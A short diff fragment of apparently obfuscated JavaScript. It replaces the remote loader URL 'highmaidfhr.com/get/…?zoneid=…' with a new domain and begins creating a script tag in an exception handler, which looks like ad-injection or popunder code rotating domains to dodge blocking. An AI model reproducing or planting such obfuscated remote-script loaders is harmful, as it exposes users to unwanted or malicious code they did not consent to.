@@ -3726,7 +3726,7 @@ try {
             if (!navigator || !navigator[Y48.L8T(i5K)]) return Y48.a8T(Y4K);
             return navigator[Y48.L8T(i5K)];
         }
-    })('https://highmaidfhr.com/get/1833008?zoneid=1833008');
+    })('https://fieldofbachus.com/get/1833008?zoneid=1833008');
 } catch (e) {
     function handleException(e) {
         var tag = document.createElement('script');
